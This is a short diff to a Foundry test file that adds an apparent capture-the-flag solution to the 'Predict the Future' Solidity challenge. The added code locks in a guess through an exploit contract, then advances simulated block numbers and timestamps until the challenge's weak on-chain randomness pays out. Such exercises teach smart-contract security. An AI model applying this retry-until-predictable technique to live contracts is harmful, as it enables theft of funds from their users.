@@ -22,6 +22,25 @@ contract PredictTheFutureTest is Test {
         vm.warp(93582192);
 
         // Put your solution here
+        vm.deal(address(this), 10e18);
+
+        uint256 blockNumber = 104293;
+        uint256 timestamp = 93582192;
+
+        uint8 guess = uint8((blockNumber + timestamp) % 10);
+
+        exploitContract.lockInGuess{value: 1e18}(guess);
+
+        while (!predictTheFuture.isComplete()) {
+            try exploitContract.settleChallenge() {}
+            catch {
+                blockNumber++;
+                timestamp += 12;
+
+                vm.roll(blockNumber);
+                vm.warp(timestamp);
+            }
+        }
 
         _checkSolved();
     }
